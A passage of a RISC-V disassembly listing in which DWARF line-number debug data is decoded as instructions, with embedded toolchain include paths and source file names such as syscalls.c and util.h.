     9d4:	0100                	addi	s0,sp,128
     9d6:	02090103          	lb	sp,32(s2)
     9da:	0100                	addi	s0,sp,128
     9dc:	02090103          	lb	sp,32(s2)
     9e0:	0100                	addi	s0,sp,128
     9e2:	02090103          	lb	sp,32(s2)
     9e6:	0100                	addi	s0,sp,128
     9e8:	02090103          	lb	sp,32(s2)
     9ec:	0100                	addi	s0,sp,128
     9ee:	02090103          	lb	sp,32(s2)
     9f2:	0100                	addi	s0,sp,128
     9f4:	02090103          	lb	sp,32(s2)
     9f8:	0100                	addi	s0,sp,128
     9fa:	02090103          	lb	sp,32(s2)
     9fe:	0100                	addi	s0,sp,128
     a00:	02090103          	lb	sp,32(s2)
     a04:	0100                	addi	s0,sp,128
     a06:	02090103          	lb	sp,32(s2)
     a0a:	0100                	addi	s0,sp,128
     a0c:	02090103          	lb	sp,32(s2)
     a10:	0100                	addi	s0,sp,128
     a12:	02090103          	lb	sp,32(s2)
     a16:	0100                	addi	s0,sp,128
     a18:	02090103          	lb	sp,32(s2)
     a1c:	0100                	addi	s0,sp,128
     a1e:	02090103          	lb	sp,32(s2)
     a22:	0100                	addi	s0,sp,128
     a24:	02090103          	lb	sp,32(s2)
     a28:	0100                	addi	s0,sp,128
     a2a:	02090103          	lb	sp,32(s2)
     a2e:	0100                	addi	s0,sp,128
     a30:	02090103          	lb	sp,32(s2)
     a34:	0100                	addi	s0,sp,128
     a36:	02090103          	lb	sp,32(s2)
     a3a:	0100                	addi	s0,sp,128
     a3c:	02090103          	lb	sp,32(s2)
     a40:	0100                	addi	s0,sp,128
     a42:	02090103          	lb	sp,32(s2)
     a46:	0100                	addi	s0,sp,128
     a48:	02090103          	lb	sp,32(s2)
     a4c:	0100                	addi	s0,sp,128
     a4e:	02090103          	lb	sp,32(s2)
     a52:	0100                	addi	s0,sp,128
     a54:	02090103          	lb	sp,32(s2)
     a58:	0100                	addi	s0,sp,128
     a5a:	02090103          	lb	sp,32(s2)
     a5e:	0100                	addi	s0,sp,128
     a60:	02090103          	lb	sp,32(s2)
     a64:	0100                	addi	s0,sp,128
     a66:	02090303          	lb	t1,32(s2)
     a6a:	0100                	addi	s0,sp,128
     a6c:	04090303          	lb	t1,64(s2)
     a70:	0100                	addi	s0,sp,128
     a72:	04090303          	lb	t1,64(s2)
     a76:	0100                	addi	s0,sp,128
     a78:	02090303          	lb	t1,32(s2)
     a7c:	0100                	addi	s0,sp,128
     a7e:	04090303          	lb	t1,64(s2)
     a82:	0100                	addi	s0,sp,128
     a84:	04090303          	lb	t1,64(s2)
     a88:	0100                	addi	s0,sp,128
     a8a:	08090103          	lb	sp,128(s2)
     a8e:	0100                	addi	s0,sp,128
     a90:	04090203          	lb	tp,64(s2)
     a94:	0100                	addi	s0,sp,128
     a96:	02090103          	lb	sp,32(s2)
     a9a:	0100                	addi	s0,sp,128
     a9c:	02090103          	lb	sp,32(s2)
     aa0:	0100                	addi	s0,sp,128
     aa2:	02090103          	lb	sp,32(s2)
     aa6:	0100                	addi	s0,sp,128
     aa8:	02090103          	lb	sp,32(s2)
     aac:	0100                	addi	s0,sp,128
     aae:	02090103          	lb	sp,32(s2)
     ab2:	0100                	addi	s0,sp,128
     ab4:	02090103          	lb	sp,32(s2)
     ab8:	0100                	addi	s0,sp,128
     aba:	02090103          	lb	sp,32(s2)
     abe:	0100                	addi	s0,sp,128
     ac0:	02090103          	lb	sp,32(s2)
     ac4:	0100                	addi	s0,sp,128
     ac6:	02090103          	lb	sp,32(s2)
     aca:	0100                	addi	s0,sp,128
     acc:	02090103          	lb	sp,32(s2)
     ad0:	0100                	addi	s0,sp,128
     ad2:	02090103          	lb	sp,32(s2)
     ad6:	0100                	addi	s0,sp,128
     ad8:	02090103          	lb	sp,32(s2)
     adc:	0100                	addi	s0,sp,128
     ade:	02090103          	lb	sp,32(s2)
     ae2:	0100                	addi	s0,sp,128
     ae4:	02090103          	lb	sp,32(s2)
     ae8:	0100                	addi	s0,sp,128
     aea:	02090103          	lb	sp,32(s2)
     aee:	0100                	addi	s0,sp,128
     af0:	02090103          	lb	sp,32(s2)
     af4:	0100                	addi	s0,sp,128
     af6:	02090103          	lb	sp,32(s2)
     afa:	0100                	addi	s0,sp,128
     afc:	02090103          	lb	sp,32(s2)
     b00:	0100                	addi	s0,sp,128
     b02:	02090103          	lb	sp,32(s2)
     b06:	0100                	addi	s0,sp,128
     b08:	02090103          	lb	sp,32(s2)
     b0c:	0100                	addi	s0,sp,128
     b0e:	02090103          	lb	sp,32(s2)
     b12:	0100                	addi	s0,sp,128
     b14:	02090103          	lb	sp,32(s2)
     b18:	0100                	addi	s0,sp,128
     b1a:	02090103          	lb	sp,32(s2)
     b1e:	0100                	addi	s0,sp,128
     b20:	02090103          	lb	sp,32(s2)
     b24:	0100                	addi	s0,sp,128
     b26:	02090103          	lb	sp,32(s2)
     b2a:	0100                	addi	s0,sp,128
     b2c:	02090103          	lb	sp,32(s2)
     b30:	0100                	addi	s0,sp,128
     b32:	02090103          	lb	sp,32(s2)
     b36:	0100                	addi	s0,sp,128
     b38:	02090103          	lb	sp,32(s2)
     b3c:	0100                	addi	s0,sp,128
     b3e:	02090103          	lb	sp,32(s2)
     b42:	0100                	addi	s0,sp,128
     b44:	02090103          	lb	sp,32(s2)
     b48:	0100                	addi	s0,sp,128
     b4a:	02090203          	lb	tp,32(s2)
     b4e:	0100                	addi	s0,sp,128
     b50:	02090103          	lb	sp,32(s2)
     b54:	0100                	addi	s0,sp,128
     b56:	0409                	addi	s0,s0,2
     b58:	0000                	unimp
     b5a:	0101                	addi	sp,sp,0
     b5c:	0088                	addi	a0,sp,64
     b5e:	0000                	unimp
     b60:	00220003          	lb	zero,2(tp) # 2 <_tdata_begin+0x2>
     b64:	0000                	unimp
     b66:	0101                	addi	sp,sp,0
     b68:	000d0efb          	0xd0efb
     b6c:	0101                	addi	sp,sp,0
     b6e:	0101                	addi	sp,sp,0
     b70:	0000                	unimp
     b72:	0100                	addi	s0,sp,128
     b74:	0000                	unimp
     b76:	7301                	lui	t1,0xfffe0
     b78:	6372                	ld	t1,280(sp)
     b7a:	0000                	unimp
     b7c:	63617473          	csrrci	s0,0x636,2
     b80:	00532e6b          	0x532e6b
     b84:	0001                	nop
     b86:	0000                	unimp
     b88:	0900                	addi	s0,sp,144
     b8a:	d002                	sw	zero,32(sp)
     b8c:	0015                	c.nop	5
     b8e:	0080                	addi	s0,sp,64
     b90:	0000                	unimp
     b92:	1700                	addi	s0,sp,928
     b94:	02090103          	lb	sp,32(s2)
     b98:	0100                	addi	s0,sp,128
     b9a:	02090403          	lb	s0,32(s2)
     b9e:	0100                	addi	s0,sp,128
     ba0:	02090103          	lb	sp,32(s2)
     ba4:	0100                	addi	s0,sp,128
     ba6:	04090103          	lb	sp,64(s2)
     baa:	0100                	addi	s0,sp,128
     bac:	04090103          	lb	sp,64(s2)
     bb0:	0100                	addi	s0,sp,128
     bb2:	04090103          	lb	sp,64(s2)
     bb6:	0100                	addi	s0,sp,128
     bb8:	04090103          	lb	sp,64(s2)
     bbc:	0100                	addi	s0,sp,128
     bbe:	04090103          	lb	sp,64(s2)
     bc2:	0100                	addi	s0,sp,128
     bc4:	04090103          	lb	sp,64(s2)
     bc8:	0100                	addi	s0,sp,128
     bca:	04090103          	lb	sp,64(s2)
     bce:	0100                	addi	s0,sp,128
     bd0:	04090103          	lb	sp,64(s2)
     bd4:	0100                	addi	s0,sp,128
     bd6:	04090103          	lb	sp,64(s2)
     bda:	0100                	addi	s0,sp,128
     bdc:	02090303          	lb	t1,32(s2)
     be0:	0100                	addi	s0,sp,128
     be2:	0209                	addi	tp,tp,2
     be4:	0000                	unimp
     be6:	0101                	addi	sp,sp,0
     be8:	1171                	addi	sp,sp,-4
     bea:	0000                	unimp
     bec:	01f60003          	lb	zero,31(a2) # fffffffffffeb01f <_end+0xffffffff7ffcfb5f>
     bf0:	0000                	unimp
     bf2:	0101                	addi	sp,sp,0
     bf4:	000d0efb          	0xd0efb
     bf8:	0101                	addi	sp,sp,0
     bfa:	0101                	addi	sp,sp,0
     bfc:	0000                	unimp
     bfe:	0100                	addi	s0,sp,128
     c00:	0000                	unimp
     c02:	6901                	0x6901
     c04:	636e                	ld	t1,216(sp)
     c06:	7300                	ld	s0,32(a4)
     c08:	6372                	ld	t1,280(sp)
     c0a:	2f00                	fld	fs0,24(a4)
     c0c:	6f68                	ld	a0,216(a4)
     c0e:	656d                	lui	a0,0x1b
     c10:	6568632f          	0x6568632f
     c14:	676e                	ld	a4,216(sp)
     c16:	6978                	ld	a4,208(a0)
     c18:	6f61                	lui	t5,0x18
     c1a:	7579                	lui	a0,0xffffe
     c1c:	6968632f          	0x6968632f
     c20:	7970                	ld	a2,240(a0)
     c22:	7261                	lui	tp,0xffff8
     c24:	2f64                	fld	fs1,216(a4)
     c26:	632e                	ld	t1,200(sp)
     c28:	61646e6f          	jal	t3,4723e <_tbss_end+0x471ba>
     c2c:	652d                	lui	a0,0xb
     c2e:	766e                	ld	a2,248(sp)
     c30:	7369722f          	0x7369722f
     c34:	742d7663          	bgeu	s10,sp,1380 <_tbss_end+0x12fc>
     c38:	736c6f6f          	jal	t5,c736e <_tbss_end+0xc72ea>
     c3c:	7369722f          	0x7369722f
     c40:	34367663          	bgeu	a2,gp,f8c <_tbss_end+0xf08>
     c44:	752d                	lui	a0,0xfffeb
     c46:	6b6e                	ld	s6,216(sp)
     c48:	6f6e                	ld	t5,216(sp)
     c4a:	652d6e77          	0x652d6e77
     c4e:	666c                	ld	a1,200(a2)
     c50:	636e692f          	0x636e692f
     c54:	756c                	ld	a1,232(a0)
     c56:	6564                	ld	s1,200(a0)
     c58:	2f00                	fld	fs0,24(a4)
     c5a:	6f68                	ld	a0,216(a4)
     c5c:	656d                	lui	a0,0x1b
     c5e:	6568632f          	0x6568632f
     c62:	676e                	ld	a4,216(sp)
     c64:	6978                	ld	a4,208(a0)
     c66:	6f61                	lui	t5,0x18
     c68:	7579                	lui	a0,0xffffe
     c6a:	6968632f          	0x6968632f
     c6e:	7970                	ld	a2,240(a0)
     c70:	7261                	lui	tp,0xffff8
     c72:	2f64                	fld	fs1,216(a4)
     c74:	632e                	ld	t1,200(sp)
     c76:	61646e6f          	jal	t3,4728c <_tbss_end+0x47208>
     c7a:	652d                	lui	a0,0xb
     c7c:	766e                	ld	a2,248(sp)
     c7e:	7369722f          	0x7369722f
     c82:	742d7663          	bgeu	s10,sp,13ce <_tbss_end+0x134a>
     c86:	736c6f6f          	jal	t5,c73bc <_tbss_end+0xc7338>
     c8a:	7369722f          	0x7369722f
     c8e:	34367663          	bgeu	a2,gp,fda <_tbss_end+0xf56>
     c92:	752d                	lui	a0,0xfffeb
     c94:	6b6e                	ld	s6,216(sp)
     c96:	6f6e                	ld	t5,216(sp)
     c98:	652d6e77          	0x652d6e77
     c9c:	666c                	ld	a1,200(a2)
     c9e:	636e692f          	0x636e692f
     ca2:	756c                	ld	a1,232(a0)
     ca4:	6564                	ld	s1,200(a0)
     ca6:	63616d2f          	0x63616d2f
     caa:	6968                	ld	a0,208(a0)
     cac:	656e                	ld	a0,216(sp)
     cae:	2f00                	fld	fs0,24(a4)
     cb0:	6f68                	ld	a0,216(a4)
     cb2:	656d                	lui	a0,0x1b
     cb4:	6568632f          	0x6568632f
     cb8:	676e                	ld	a4,216(sp)
     cba:	6978                	ld	a4,208(a0)
     cbc:	6f61                	lui	t5,0x18
     cbe:	7579                	lui	a0,0xffffe
     cc0:	6968632f          	0x6968632f
     cc4:	7970                	ld	a2,240(a0)
     cc6:	7261                	lui	tp,0xffff8
     cc8:	2f64                	fld	fs1,216(a4)
     cca:	632e                	ld	t1,200(sp)
     ccc:	61646e6f          	jal	t3,472e2 <_tbss_end+0x4725e>
     cd0:	652d                	lui	a0,0xb
     cd2:	766e                	ld	a2,248(sp)
     cd4:	7369722f          	0x7369722f
     cd8:	742d7663          	bgeu	s10,sp,1424 <_tbss_end+0x13a0>
     cdc:	736c6f6f          	jal	t5,c7412 <_tbss_end+0xc738e>
     ce0:	7369722f          	0x7369722f
     ce4:	34367663          	bgeu	a2,gp,1030 <_tbss_end+0xfac>
     ce8:	752d                	lui	a0,0xfffeb
     cea:	6b6e                	ld	s6,216(sp)
     cec:	6f6e                	ld	t5,216(sp)
     cee:	652d6e77          	0x652d6e77
     cf2:	666c                	ld	a1,200(a2)
     cf4:	636e692f          	0x636e692f
     cf8:	756c                	ld	a1,232(a0)
     cfa:	6564                	ld	s1,200(a0)
     cfc:	7379732f          	0x7379732f
     d00:	2f00                	fld	fs0,24(a4)
     d02:	6f68                	ld	a0,216(a4)
     d04:	656d                	lui	a0,0x1b
     d06:	6568632f          	0x6568632f
     d0a:	676e                	ld	a4,216(sp)
     d0c:	6978                	ld	a4,208(a0)
     d0e:	6f61                	lui	t5,0x18
     d10:	7579                	lui	a0,0xffffe
     d12:	6968632f          	0x6968632f
     d16:	7970                	ld	a2,240(a0)
     d18:	7261                	lui	tp,0xffff8
     d1a:	2f64                	fld	fs1,216(a4)
     d1c:	632e                	ld	t1,200(sp)
     d1e:	61646e6f          	jal	t3,47334 <_tbss_end+0x472b0>
     d22:	652d                	lui	a0,0xb
     d24:	766e                	ld	a2,248(sp)
     d26:	7369722f          	0x7369722f
     d2a:	742d7663          	bgeu	s10,sp,1476 <_tbss_end+0x13f2>
     d2e:	736c6f6f          	jal	t5,c7464 <_tbss_end+0xc73e0>
     d32:	62696c2f          	0x62696c2f
     d36:	6363672f          	0x6363672f
     d3a:	7369722f          	0x7369722f
     d3e:	34367663          	bgeu	a2,gp,108a <_tbss_end+0x1006>
     d42:	752d                	lui	a0,0xfffeb
     d44:	6b6e                	ld	s6,216(sp)
     d46:	6f6e                	ld	t5,216(sp)
     d48:	652d6e77          	0x652d6e77
     d4c:	666c                	ld	a1,200(a2)
     d4e:	322e392f          	0x322e392f
     d52:	302e                	fld	ft0,232(sp)
     d54:	636e692f          	0x636e692f
     d58:	756c                	ld	a1,232(a0)
     d5a:	6564                	ld	s1,200(a0)
     d5c:	0000                	unimp
     d5e:	7475                	lui	s0,0xffffd
     d60:	6c69                	lui	s8,0x1a
     d62:	682e                	ld	a6,200(sp)
     d64:	0100                	addi	s0,sp,128
     d66:	0000                	unimp
     d68:	63737973          	csrrci	s2,0x637,6
     d6c:	6c61                	lui	s8,0x18
     d6e:	736c                	ld	a1,224(a4)
     d70:	632e                	ld	t1,200(sp)
     d72:	0200                	addi	s0,sp,256
     d74:	0000                	unimp
     d76:	69647473          	csrrci	s0,0x696,8
     d7a:	00682e6f          	jal	t3,82d80 <_tbss_end+0x82cfc>
     d7e:	5f000003          	lb	zero,1520(zero) # 5f0 <_tbss_end+0x56c>
     d82:	6564                	ld	s1,200(a0)
     d84:	6166                	ld	sp,88(sp)
     d86:	6c75                	lui	s8,0x1d
     d88:	5f74                	lw	a3,124(a4)
     d8a:	7974                	ld	a3,240(a0)
     d8c:	6570                	ld	a2,200(a0)
     d8e:	00682e73          	csrrs	t3,0x6,a6
     d92:	0004                	0x4
     d94:	5f00                	lw	s0,56(a4)
     d96:	69647473          	csrrci	s0,0x696,8
     d9a:	746e                	ld	s0,248(sp)
     d9c:	682e                	ld	a6,200(sp)
     d9e:	0500                	addi	s0,sp,640
     da0:	0000                	unimp
     da2:	64647473          	csrrci	s0,0x646,8
     da6:	6665                	lui	a2,0x19
     da8:	682e                	ld	a6,200(sp)
     daa:	0600                	addi	s0,sp,768
     dac:	0000                	unimp
     dae:	745f 7079 7365      	0x73657079745f
     db4:	682e                	ld	a6,200(sp)
     db6:	0500                	addi	s0,sp,640
     db8:	0000                	unimp
     dba:	6572                	ld	a0,280(sp)
     dbc:	6e65                	lui	t3,0x19
     dbe:	2e74                	fld	fa3,216(a2)
     dc0:	0068                	addi	a0,sp,12
     dc2:	0005                	c.nop	1
     dc4:	6c00                	ld	s0,24(s0)
     dc6:	2e6b636f          	jal	t1,b70ac <_tbss_end+0xb7028>
     dca:	0068                	addi	a0,sp,12
     dcc:	0005                	c.nop	1
     dce:	7300                	ld	s0,32(a4)
     dd0:	6474                	ld	a3,200(s0)
     dd2:	7261                	lui	tp,0xffff8
     dd4:	00682e67          	0x682e67
     dd8:	0006                	c.slli	zero,0x1
     dda:	7300                	ld	s0,32(a4)
     ddc:	7274                	ld	a3,224(a2)
     dde:	6e69                	lui	t3,0x1a
     de0:	00682e67          	0x682e67
     de4:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     de8:	0105                	addi	sp,sp,1
     dea:	0900                	addi	s0,sp,144
     dec:	fe02                	sd	zero,312(sp)
     dee:	0015                	c.nop	5
     df0:	0080                	addi	s0,sp,64
     df2:	0000                	unimp
     df4:	0300                	addi	s0,sp,384
     df6:	0128                	addi	a0,sp,136
     df8:	14090803          	lb	a6,320(s2)
     dfc:	0100                	addi	s0,sp,128
     dfe:	08090303          	lb	t1,128(s2)
     e02:	0100                	addi	s0,sp,128
     e04:	14090803          	lb	a6,320(s2)
     e08:	0100                	addi	s0,sp,128
     e0a:	08090303          	lb	t1,128(s2)
     e0e:	0100                	addi	s0,sp,128
     e10:	0a05                	addi	s4,s4,1
     e12:	14090303          	lb	t1,320(s2)
     e16:	0100                	addi	s0,sp,128
     e18:	0305                	addi	t1,t1,1
     e1a:	04090003          	lb	zero,64(s2)
     e1e:	0100                	addi	s0,sp,128
     e20:	1205                	addi	tp,tp,-31
     e22:	02090203          	lb	tp,32(s2)
     e26:	0100                	addi	s0,sp,128
     e28:	0905                	addi	s2,s2,1
     e2a:	0c090003          	lb	zero,192(s2)
     e2e:	0100                	addi	s0,sp,128
     e30:	2005                	0x2005
     e32:	06090003          	lb	zero,96(s2)
     e36:	0100                	addi	s0,sp,128
     e38:	1705                	addi	a4,a4,-31
     e3a:	0e090003          	lb	zero,224(s2)
     e3e:	0100                	addi	s0,sp,128
     e40:	1405                	addi	s0,s0,-31
     e42:	06090103          	lb	sp,96(s2)
     e46:	0100                	addi	s0,sp,128
     e48:	0905                	addi	s2,s2,1
     e4a:	0c090003          	lb	zero,192(s2)
     e4e:	0100                	addi	s0,sp,128
     e50:	2405                	addiw	s0,s0,1
     e52:	06090003          	lb	zero,96(s2)
     e56:	0100                	addi	s0,sp,128
     e58:	1905                	addi	s2,s2,-31
     e5a:	0e090003          	lb	zero,224(s2)
     e5e:	0100                	addi	s0,sp,128
     e60:	0805                	addi	a6,a6,1
     e62:	06090103          	lb	sp,96(s2)
     e66:	0100                	addi	s0,sp,128
     e68:	1b05                	addi	s6,s6,-31
     e6a:	0200                	addi	s0,sp,256
     e6c:	0104                	addi	s1,sp,128
     e6e:	10090003          	lb	zero,256(s2)
     e72:	0100                	addi	s0,sp,128
     e74:	0805                	addi	a6,a6,1
     e76:	0a090103          	lb	sp,160(s2)
     e7a:	0100                	addi	s0,sp,128
     e7c:	1b05                	addi	s6,s6,-31
     e7e:	0200                	addi	s0,sp,256
     e80:	0104                	addi	s1,sp,128
     e82:	10090003          	lb	zero,256(s2)
     e86:	0100                	addi	s0,sp,128
     e88:	0200                	addi	s0,sp,256
     e8a:	0204                	addi	s1,sp,256
     e8c:	0a097b03          	0xa097b03
     e90:	0100                	addi	s0,sp,128
     e92:	1405                	addi	s0,s0,-31
     e94:	0200                	addi	s0,sp,256
     e96:	0104                	addi	s1,sp,128
     e98:	0a090003          	lb	zero,160(s2)
     e9c:	0100                	addi	s0,sp,128
     e9e:	1605                	addi	a2,a2,-31
     ea0:	0200                	addi	s0,sp,256
     ea2:	0104                	addi	s1,sp,128
     ea4:	10090003          	lb	zero,256(s2)
     ea8:	0100                	addi	s0,sp,128
     eaa:	0305                	addi	t1,t1,1
     eac:	0200                	addi	s0,sp,256
     eae:	0104                	addi	s1,sp,128
     eb0:	08090003          	lb	zero,128(s2)
     eb4:	0100                	addi	s0,sp,128
     eb6:	0d05                	addi	s10,s10,1
     eb8:	0a090703          	lb	a4,160(s2)
     ebc:	0100                	addi	s0,sp,128
     ebe:	0605                	addi	a2,a2,1
     ec0:	08090003          	lb	zero,128(s2)
     ec4:	0100                	addi	s0,sp,128
     ec6:	1905                	addi	s2,s2,-31
     ec8:	0200                	addi	s0,sp,256
     eca:	0104                	addi	s1,sp,128
     ecc:	02090003          	lb	zero,32(s2)
     ed0:	0100                	addi	s0,sp,128
     ed2:	2805                	addiw	a6,a6,1
     ed4:	0200                	addi	s0,sp,256
     ed6:	0104                	addi	s1,sp,128
     ed8:	14090003          	lb	zero,320(s2)
     edc:	0100                	addi	s0,sp,128
     ede:	1f05                	addi	t5,t5,-31
     ee0:	0200                	addi	s0,sp,256
     ee2:	0104                	addi	s1,sp,128
     ee4:	0e090003          	lb	zero,224(s2)
     ee8:	0100                	addi	s0,sp,128
     eea:	1205                	addi	tp,tp,-31
     eec:	0200                	addi	s0,sp,256
     eee:	0104                	addi	s1,sp,128
     ef0:	02090003          	lb	zero,32(s2)
     ef4:	0100                	addi	s0,sp,128
     ef6:	0c05                	addi	s8,s8,1
     ef8:	06090103          	lb	sp,96(s2)
     efc:	0100                	addi	s0,sp,128
     efe:	0a05                	addi	s4,s4,1
     f00:	06090103          	lb	sp,96(s2)
     f04:	0100                	addi	s0,sp,128
     f06:	0105                	addi	sp,sp,1
     f08:	02090103          	lb	sp,32(s2)
     f0c:	0100                	addi	s0,sp,128
     f0e:	08090303          	lb	t1,128(s2)
     f12:	0100                	addi	s0,sp,128
     f14:	0a05                	addi	s4,s4,1
     f16:	14090303          	lb	t1,320(s2)
     f1a:	0100                	addi	s0,sp,128
     f1c:	0305                	addi	t1,t1,1
     f1e:	04090003          	lb	zero,64(s2)
     f22:	0100                	addi	s0,sp,128
     f24:	1505                	addi	a0,a0,-31
     f26:	02090203          	lb	tp,32(s2)
     f2a:	0100                	addi	s0,sp,128
     f2c:	0c05                	addi	s8,s8,1
     f2e:	0c090003          	lb	zero,192(s2)
     f32:	0100                	addi	s0,sp,128
     f34:	2305                	addiw	t1,t1,1
     f36:	06090003          	lb	zero,96(s2)
     f3a:	0100                	addi	s0,sp,128
     f3c:	1a05                	addi	s4,s4,-31
     f3e:	0e090003          	lb	zero,224(s2)
     f42:	0100                	addi	s0,sp,128
     f44:	1705                	addi	a4,a4,-31
     f46:	06090103          	lb	sp,96(s2)
     f4a:	0100                	addi	s0,sp,128
     f4c:	0c05                	addi	s8,s8,1
     f4e:	0c090003          	lb	zero,192(s2)
     f52:	0100                	addi	s0,sp,128
     f54:	2705                	addiw	a4,a4,1
     f56:	06090003          	lb	zero,96(s2)
     f5a:	0100                	addi	s0,sp,128
     f5c:	1c05                	addi	s8,s8,-31
     f5e:	0e090003          	lb	zero,224(s2)
     f62:	0100                	addi	s0,sp,128
     f64:	1205                	addi	tp,tp,-31
     f66:	06090103          	lb	sp,96(s2)
     f6a:	0100                	addi	s0,sp,128
     f6c:	0905                	addi	s2,s2,1
     f6e:	14090003          	lb	zero,320(s2)
     f72:	0100                	addi	s0,sp,128
     f74:	2205                	addiw	tp,tp,1
     f76:	04090003          	lb	zero,64(s2)
     f7a:	0100                	addi	s0,sp,128
     f7c:	1905                	addi	s2,s2,-31
     f7e:	14090003          	lb	zero,320(s2)
     f82:	0100                	addi	s0,sp,128
     f84:	0f05                	addi	t5,t5,1
     f86:	04090103          	lb	sp,64(s2)
     f8a:	0100                	addi	s0,sp,128
     f8c:	0805                	addi	a6,a6,1
     f8e:	0c090003          	lb	zero,192(s2)
     f92:	0100                	addi	s0,sp,128
     f94:	1f05                	addi	t5,t5,-31
     f96:	0200                	addi	s0,sp,256
     f98:	0104                	addi	s1,sp,128
     f9a:	02090003          	lb	zero,32(s2)
     f9e:	0100                	addi	s0,sp,128
     fa0:	2105                	addiw	sp,sp,1
     fa2:	0200                	addi	s0,sp,256
     fa4:	0104                	addi	s1,sp,128
     fa6:	08090003          	lb	zero,128(s2)
     faa:	0100                	addi	s0,sp,128
     fac:	1b05                	addi	s6,s6,-31
     fae:	0200                	addi	s0,sp,256
     fb0:	0204                	addi	s1,sp,256
     fb2:	0a097b03          	0xa097b03
     fb6:	0100                	addi	s0,sp,128
     fb8:	1405                	addi	s0,s0,-31
     fba:	0200                	addi	s0,sp,256
     fbc:	0104                	addi	s1,sp,128
     fbe:	0a090003          	lb	zero,160(s2)
     fc2:	0100                	addi	s0,sp,128
     fc4:	1605                	addi	a2,a2,-31
     fc6:	0200                	addi	s0,sp,256
     fc8:	0104                	addi	s1,sp,128
     fca:	10090003          	lb	zero,256(s2)
     fce:	0100                	addi	s0,sp,128
     fd0:	0305                	addi	t1,t1,1
     fd2:	0200                	addi	s0,sp,256
     fd4:	0104                	addi	s1,sp,128
     fd6:	08090003          	lb	zero,128(s2)
     fda:	0100                	addi	s0,sp,128
     fdc:	0d05                	addi	s10,s10,1
     fde:	0a090703          	lb	a4,160(s2)
     fe2:	0100                	addi	s0,sp,128
     fe4:	0605                	addi	a2,a2,1
     fe6:	08090003          	lb	zero,128(s2)
     fea:	0100                	addi	s0,sp,128
     fec:	1905                	addi	s2,s2,-31
     fee:	0200                	addi	s0,sp,256
     ff0:	0104                	addi	s1,sp,128
     ff2:	02090003          	lb	zero,32(s2)
     ff6:	0100                	addi	s0,sp,128
     ff8:	2805                	addiw	a6,a6,1
     ffa:	0200                	addi	s0,sp,256
     ffc:	0104                	addi	s1,sp,128
     ffe:	10090003          	lb	zero,256(s2)
    1002:	0100                	addi	s0,sp,128
    1004:	1205                	addi	tp,tp,-31
    1006:	0200                	addi	s0,sp,256
    1008:	0104                	addi	s1,sp,128
    100a:	10090003          	lb	zero,256(s2)
    100e:	0100                	addi	s0,sp,128
    1010:	0c05                	addi	s8,s8,1
    1012:	06090103          	lb	sp,96(s2)
    1016:	0100                	addi	s0,sp,128
    1018:	0a05                	addi	s4,s4,1
    101a:	06090103          	lb	sp,96(s2)
    101e:	0100                	addi	s0,sp,128
    1020:	0105                	addi	sp,sp,1
    1022:	02090103          	lb	sp,32(s2)
    1026:	0100                	addi	s0,sp,128
    1028:	08090303          	lb	t1,128(s2)
    102c:	0100                	addi	s0,sp,128
    102e:	0305                	addi	t1,t1,1
    1030:	0c090503          	lb	a0,192(s2)
    1034:	0100                	addi	s0,sp,128
    1036:	1105                	addi	sp,sp,-31
    1038:	04090203          	lb	tp,64(s2)
    103c:	0100                	addi	s0,sp,128
    103e:	0f05                	addi	t5,t5,1
    1040:	10090003          	lb	zero,256(s2)
    1044:	0100                	addi	s0,sp,128
    1046:	0705                	addi	a4,a4,1
    1048:	04090103          	lb	sp,64(s2)
    104c:	0100                	addi	s0,sp,128
    104e:	3005                	0x3005
    1050:	1a090003          	lb	zero,416(s2)
    1054:	0100                	addi	s0,sp,128
    1056:	0605                	addi	a2,a2,1
    1058:	08090003          	lb	zero,128(s2)
    105c:	0100                	addi	s0,sp,128
    105e:	0b05                	addi	s6,s6,1
    1060:	04090203          	lb	tp,64(s2)
    1064:	0100                	addi	s0,sp,128
    1066:	0c090103          	lb	sp,192(s2)
    106a:	0100                	addi	s0,sp,128
    106c:	0d05                	addi	s10,s10,1
    106e:	10090203          	lb	tp,256(s2)
    1072:	0100                	addi	s0,sp,128
    1074:	1405                	addi	s0,s0,-31
    1076:	0200                	addi	s0,sp,256
    1078:	0104                	addi	s1,sp,128
    107a:	02090003          	lb	zero,32(s2)
    107e:	0100                	addi	s0,sp,128
    1080:	0d05                	addi	s10,s10,1
    1082:	0200                	addi	s0,sp,256
    1084:	0104                	addi	s1,sp,128
    1086:	12090003          	lb	zero,288(s2)
    108a:	0100                	addi	s0,sp,128
    108c:	0305                	addi	t1,t1,1
    108e:	04090303          	lb	t1,64(s2)
    1092:	0100                	addi	s0,sp,128
    1094:	0105                	addi	sp,sp,1
    1096:	04090103          	lb	sp,64(s2)
    109a:	0100                	addi	s0,sp,128
    109c:	08090303          	lb	t1,128(s2)
    10a0:	0100                	addi	s0,sp,128
    10a2:	1a05                	addi	s4,s4,-31
    10a4:	0a090103          	lb	sp,160(s2)
    10a8:	0100                	addi	s0,sp,128
    10aa:	1505                	addi	a0,a0,-31
    10ac:	08090003          	lb	zero,128(s2)
    10b0:	0100                	addi	s0,sp,128
    10b2:	0c05                	addi	s8,s8,1
    10b4:	06090003          	lb	zero,96(s2)
    10b8:	0100                	addi	s0,sp,128
    10ba:	0d05                	addi	s10,s10,1
    10bc:	06090103          	lb	sp,96(s2)
    10c0:	0100                	addi	s0,sp,128
    10c2:	1a05                	addi	s4,s4,-31
    10c4:	08090003          	lb	zero,128(s2)
    10c8:	0100                	addi	s0,sp,128
    10ca:	1305                	addi	t1,t1,-31
    10cc:	06090003          	lb	zero,96(s2)
    10d0:	0100                	addi	s0,sp,128
    10d2:	0105                	addi	sp,sp,1
    10d4:	02090103          	lb	sp,32(s2)
    10d8:	0100                	addi	s0,sp,128
    10da:	0204                	addi	s1,sp,256
    10dc:	097f9d03          	lh	s10,151(t6)
    10e0:	0008                	0x8
    10e2:	0501                	addi	a0,a0,0
    10e4:	0310                	addi	a2,sp,384
    10e6:	0902                	c.slli64	s2
    10e8:	002e                	c.slli	zero,0xb
    10ea:	0301                	addi	t1,t1,0
    10ec:	0901                	addi	s2,s2,0
    10ee:	0006                	c.slli	zero,0x1
    10f0:	0301                	addi	t1,t1,0
    10f2:	0901                	addi	s2,s2,0
    10f4:	0006                	c.slli	zero,0x1
    10f6:	0301                	addi	t1,t1,0
    10f8:	0901                	addi	s2,s2,0
    10fa:	0006                	c.slli	zero,0x1
    10fc:	0501                	addi	a0,a0,0
    10fe:	09010303          	lb	t1,144(sp) # 50b01fe <_tbss_end+0x50b017a>
    1102:	0006                	c.slli	zero,0x1
    1104:	0501                	addi	a0,a0,0
    1106:	030c                	addi	a1,sp,384
